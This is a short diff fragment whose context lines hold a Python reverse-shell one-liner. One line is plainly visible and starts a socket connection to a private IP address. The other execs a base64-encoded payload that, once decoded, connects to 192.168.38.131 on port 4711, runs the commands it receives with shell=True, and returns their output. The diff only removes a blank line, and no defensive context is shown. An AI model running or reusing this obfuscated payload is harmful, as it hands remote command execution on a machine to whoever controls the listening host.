@@ -10,4 +10,3 @@ shell = "import socket, subprocess;s = socket.socket();s.connect(('192.168.38.13
 python -c "exec('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo JzE5Mi4xNjguMzguMTMxJyw0NzExKSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVu KHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJy PXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRv dXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=\n'.decode('base64'))"
 
 
-
